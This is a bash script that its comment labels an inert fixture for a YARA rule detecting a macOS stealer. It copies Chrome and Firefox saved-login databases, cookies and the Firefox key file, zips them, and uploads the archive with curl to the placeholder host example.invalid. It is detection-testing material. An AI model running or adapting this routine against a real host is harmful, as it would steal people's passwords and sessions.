#!/bin/bash
# Inert YARA fixture for CERBER_MacOS_Stealer_Browser_Data_Exfil - text only, not a working sample.
C="$HOME/Library/Application Support/Google/Chrome"
cp "$C/Default/Login Data" /tmp/s/
cp "$C/Default/Cookies" /tmp/s/
cp "$C/Default/Web Data" /tmp/s/
cp "$HOME"/Library/Application\ Support/Firefox/Profiles/*/key4.db /tmp/s/
cp "$HOME"/Library/Application\ Support/Firefox/Profiles/*/logins.json /tmp/s/
ditto -c -k /tmp/s /tmp/s.zip
curl -X POST -F "file=@/tmp/s.zip" http://example.invalid/upload
